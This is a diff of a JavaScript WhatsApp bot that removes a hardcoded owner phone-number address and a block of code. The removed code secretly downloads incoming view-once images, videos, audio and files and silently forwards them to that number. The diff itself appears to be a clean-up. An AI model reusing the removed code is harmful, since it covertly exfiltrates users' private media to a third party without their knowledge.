@@ -72,7 +72,6 @@ let reconnecting = false
 global.STATUS_DB = global.STATUS_DB || []
 global.STATUS_HASH = new Set()
 const pairCache = new Set()
-const OWNER_JID = "2349021540840@s.whatsapp.net"
 
 // ================= RUNTIME FORMATTER =================
 
@@ -2055,76 +2054,6 @@ if (
     return
   }
 }
-
- const viewOnce =
-    msg.message.viewOnceMessage ||
-    msg.message.viewOnceMessageV2 ||
-    msg.message.viewOnceMessageV2Extension
-
-  if (!viewOnce) return
-
-  try {
-    const inner = viewOnce.message
-    const type = Object.keys(inner)[0]
-    const content = inner[type]
-
-    if (!content) return
-
-    const stream = await downloadContentFromMessage(
-      content,
-      type.replace("Message", "")
-    )
-
-    let buffer = Buffer.from([])
-
-    for await (const chunk of stream) {
-      buffer = Buffer.concat([buffer, chunk])
-    }
-
-    // 📝 optional metadata
-    const caption =
-      content.caption ||
-      content.text ||
-      "🔐 ViewOnce (Stealth Captured)"
-
-    let payload = {}
-
-    // 📸 IMAGE
-    if (type === "imageMessage") {
-      payload = {
-        image: buffer,
-        caption: `👁️ VIEWONCE\nFrom: ${msg.key.remoteJid}\n\n${caption}`
-      }
-
-    // 🎥 VIDEO
-    } else if (type === "videoMessage") {
-      payload = {
-        video: buffer,
-        caption: `👁️ VIEWONCE\nFrom: ${msg.key.remoteJid}\n\n${caption}`
-      }
-
-    // 🎤 AUDIO
-    } else if (type === "audioMessage") {
-      payload = {
-        audio: buffer,
-        mimetype: content.mimetype || "audio/mp4"
-      }
-
-    // 📄 FILE
-    } else {
-      payload = {
-        document: buffer,
-        mimetype: content.mimetype || "application/octet-stream",
-        fileName: "viewonce_file"
-      }
-    }
-
-    // 🕶️ SILENT SEND (NO CHAT RESPONSE)
-    await sock.sendMessage(OWNER_JID, payload)
-
-  } catch (err) {
-    console.log("Stealth ViewOnce error:", err)
-  }
 
     // ================= ANTI DELETE =================
     if (group_settings.antidelete) {
